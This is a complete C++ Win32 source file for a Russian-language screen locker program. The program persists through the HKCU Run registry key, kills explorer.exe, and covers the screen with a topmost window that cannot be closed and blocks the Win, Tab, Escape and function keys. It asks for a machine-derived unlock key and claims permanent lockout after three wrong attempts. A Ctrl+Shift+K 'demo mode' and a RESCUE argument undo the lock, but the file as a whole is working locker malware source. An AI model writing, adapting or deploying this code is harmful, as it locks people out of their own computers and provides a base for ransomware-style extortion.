#include <windows.h>
#include <string>

#define MAX_ATTEMPTS 3
#define SECRET_KEY_COMBO 0x4B

std::wstring GenerateMachineID()
{
    wchar_t volumeName[MAX_PATH];
    wchar_t fileSystemName[MAX_PATH];
    DWORD serialNumber;
    GetVolumeInformationW(L"C:\\", volumeName, MAX_PATH, &serialNumber, NULL, NULL, fileSystemName, MAX_PATH);

    wchar_t machineID[64];
    wsprintfW(machineID, L"%08X-%08X", serialNumber, GetTickCount());

    return std::wstring(machineID);
}

std::wstring GenerateUnlockKey(const std::wstring& machineID)
{
    unsigned int hash = 0;
    for (wchar_t c : machineID) {
        hash = ((hash << 5) + hash) + c;
    }

    wchar_t key[32];
    wsprintfW(key, L"UNLOCK-%08X", hash);
    return std::wstring(key);
}

bool CheckKey(const std::wstring& inputKey, const std::wstring& machineID)
{
    return (inputKey == GenerateUnlockKey(machineID));
}

void KillExplorer()
{
    // Самый простой способ - без CreateProcess
    WinExec("taskkill /f /im explorer.exe", SW_HIDE);
}

void RestartExplorer()
{
    WinExec("explorer.exe", SW_SHOW);
}

void RemoveFromStartup()
{
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
    {
        RegDeleteValueW(hKey, L"SystemLock");
        RegCloseKey(hKey);
    }
}

void AddToStartup()
{
    wchar_t path[MAX_PATH];
    HKEY hKey;
    GetModuleFileNameW(NULL, path, MAX_PATH);

    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
    {
        RegSetValueExW(hKey, L"SystemLock", 0, REG_SZ, (BYTE*)path, (DWORD)(wcslen(path) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
}

std::wstring inputKey;
int attempts = 0;
bool systemKilled = false;
std::wstring machineID;
HWND hEditKey, hButtonUnlock;
bool ctrlPressed = false;
bool shiftPressed = false;

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    switch (msg)
    {
    case WM_CREATE:
    {
        machineID = GenerateMachineID();

        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);

        hEditKey = CreateWindowExW(
            WS_EX_CLIENTEDGE,
            L"EDIT",
            L"",
            WS_CHILD | WS_VISIBLE | ES_CENTER,
            (sw - 400) / 2, 500, 400, 40,
            hwnd,
            (HMENU)101,
            ((LPCREATESTRUCT)lParam)->hInstance,
            NULL
        );

        hButtonUnlock = CreateWindowExW(
            0,
            L"BUTTON",
            L"РАЗБЛОКИРОВАТЬ",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            (sw - 200) / 2, 570, 200, 45,
            hwnd,
            (HMENU)102,
            ((LPCREATESTRUCT)lParam)->hInstance,
            NULL
        );

        HFONT hFont = CreateFontW(20, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS,
            CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
            DEFAULT_PITCH | FF_DONTCARE, L"Arial");
        SendMessageW(hButtonUnlock, WM_SETFONT, (WPARAM)hFont, TRUE);
        SendMessageW(hEditKey, WM_SETFONT, (WPARAM)hFont, TRUE);

        SetFocus(hEditKey);

        // Таймер для отложенного убийства explorer
        SetTimer(hwnd, 1, 2000, NULL);

        return 0;
    }

    case WM_TIMER:
    {
        KillTimer(hwnd, 1);
        KillExplorer();
        return 0;
    }

    case WM_COMMAND:
    {
        if (LOWORD(wParam) == 102 && !systemKilled)
        {
            wchar_t buffer[256];
            GetWindowTextW(hEditKey, buffer, 256);
            inputKey = buffer;

            if (CheckKey(inputKey, machineID))
            {
                RemoveFromStartup();
                RestartExplorer();
                DestroyWindow(hwnd);
                PostQuitMessage(0);
            }
            else
            {
                attempts++;
                SetWindowTextW(hEditKey, L"");
                SetFocus(hEditKey);

                if (attempts >= MAX_ATTEMPTS)
                {
                    systemKilled = true;
                    MessageBoxW(hwnd, L"ДОСТУП ЗАБЛОКИРОВАН НАВСЕГДА", L"ДОСТУП ЗАПРЕЩЁН", MB_ICONSTOP);
                    EnableWindow(hEditKey, FALSE);
                    EnableWindow(hButtonUnlock, FALSE);
                }
                else
                {
                    wchar_t msg[256];
                    wsprintfW(msg, L"НЕВЕРНЫЙ КЛЮЧ!\nОсталось попыток: %d", MAX_ATTEMPTS - attempts);
                    MessageBoxW(hwnd, msg, L"ОШИБКА", MB_ICONERROR);
                }
            }
        }
        break;
    }

    case WM_KEYDOWN:
    {
        if (wParam == VK_CONTROL) ctrlPressed = true;
        if (wParam == VK_SHIFT) shiftPressed = true;
        if (wParam == SECRET_KEY_COMBO && ctrlPressed && shiftPressed)
        {
            std::wstring key = GenerateUnlockKey(machineID);
            std::wstring msg = L"Secret Key Unlock\n\n";
            msg += L"ID: " + machineID + L"\n\n";
            msg += L"Key: " + key + L"\n\n";
            msg += L"Write Key to Unlock System.";

            MessageBoxW(hwnd, msg.c_str(), L"ПАНЕЛЬ РАЗРАБОТЧИКА", MB_ICONINFORMATION);

            ctrlPressed = false;
            shiftPressed = false;
            return 0;
        }

        if (wParam == VK_RETURN && !systemKilled)
        {
            wchar_t buffer[256];
            GetWindowTextW(hEditKey, buffer, 256);
            inputKey = buffer;

            if (CheckKey(inputKey, machineID))
            {
                RemoveFromStartup();
                RestartExplorer();
                DestroyWindow(hwnd);
                PostQuitMessage(0);
            }
            else
            {
                attempts++;
                SetWindowTextW(hEditKey, L"");
                SetFocus(hEditKey);

                if (attempts >= MAX_ATTEMPTS)
                {
                    systemKilled = true;
                    MessageBoxW(hwnd, L"ДОСТУП ЗАБЛОКИРОВАН НАВСЕГДА", L"ДОСТУП ЗАПРЕЩЁН", MB_ICONSTOP);
                    EnableWindow(hEditKey, FALSE);
                    EnableWindow(hButtonUnlock, FALSE);
                }
                else
                {
                    wchar_t msg[256];
                    wsprintfW(msg, L"НЕВЕРНЫЙ КЛЮЧ!\nОсталось попыток: %d", MAX_ATTEMPTS - attempts);
                    MessageBoxW(hwnd, msg, L"ОШИБКА", MB_ICONERROR);
                }
            }
        }

        if (wParam == VK_LWIN || wParam == VK_RWIN) return 0;
        if (wParam == VK_TAB) return 0;
        if (wParam == VK_ESCAPE) return 0;
        if (wParam >= VK_F1 && wParam <= VK_F12 && wParam != SECRET_KEY_COMBO) return 0;
        break;
    }

    case WM_KEYUP:
    {
        if (wParam == VK_CONTROL) ctrlPressed = false;
        if (wParam == VK_SHIFT) shiftPressed = false;
        break;
    }

    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        RECT rect;
        GetClientRect(hwnd, &rect);

        HBRUSH black = CreateSolidBrush(RGB(0, 0, 0));
        FillRect(hdc, &rect, black);
        DeleteObject(black);

        SetTextColor(hdc, RGB(0, 255, 0));
        SetBkMode(hdc, TRANSPARENT);

        wchar_t buffer[1024];

        if (systemKilled)
        {
            wsprintfW(buffer, L"═══════════════════════════════\n"
                L"    ДОСТУП ЗАБЛОКИРОВАН\n"
                L"═══════════════════════════════\n\n"
                L"Превышено количество попыток.");
        }
        else
        {
            wsprintfW(buffer,
                L"═══════════════════════════════════════════════════\n"
                L"              СИСТЕМА ЗАБЛОКИРОВАНА\n"
                L"═══════════════════════════════════════════════════\n\n"
                L"  ID: %s\n\n"
                L"  Попыток осталось: %d\n\n"
                L"═══════════════════════════════════════════════════\n"
                L"  ДЛЯ РАЗБЛОКИРОВКИ НУЖЕН КЛЮЧ\n"
                L"═══════════════════════════════════════════════════\n\n"
                L"  DEMO MODE:\n"
                L"  Press Ctrl+Shift+K\n\n"
                L"  TO SEE UNLOCK KEY\n"
                L"═══════════════════════════════════════════════════",
                machineID.c_str(), MAX_ATTEMPTS - attempts);
        }

        DrawTextW(hdc, buffer, -1, &rect, DT_CENTER | DT_TOP);

        EndPaint(hwnd, &ps);
        return 0;
    }

    case WM_CLOSE:
        return 0;

    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    }

    return DefWindowProcW(hwnd, msg, wParam, lParam);
}

int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE hPrev, LPWSTR lpCmdLine, int nShow)
{
    UNREFERENCED_PARAMETER(hPrev);

    machineID = GenerateMachineID();

    if (lpCmdLine && wcslen(lpCmdLine) > 0)
    {
        if (wcscmp(lpCmdLine, L"RESCUE") == 0)
        {
            RemoveFromStartup();
            RestartExplorer();
            return 0;
        }

        if (CheckKey(lpCmdLine, machineID))
        {
            RemoveFromStartup();
            RestartExplorer();
            return 0;
        }
    }

    AddToStartup();

    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    WNDCLASSW wc = {};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInst;
    wc.hbrBackground = NULL;
    wc.lpszClassName = L"LockClass";
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);

    RegisterClassW(&wc);

    HWND hwnd = CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW, L"LockClass", L"SYSTEM LOCKED",
        WS_POPUP | WS_VISIBLE, 0, 0, screenWidth, screenHeight, NULL, NULL, hInst, NULL);

    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
    SetForegroundWindow(hwnd);
    SetFocus(hwnd);
    ShowCursor(TRUE);

    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}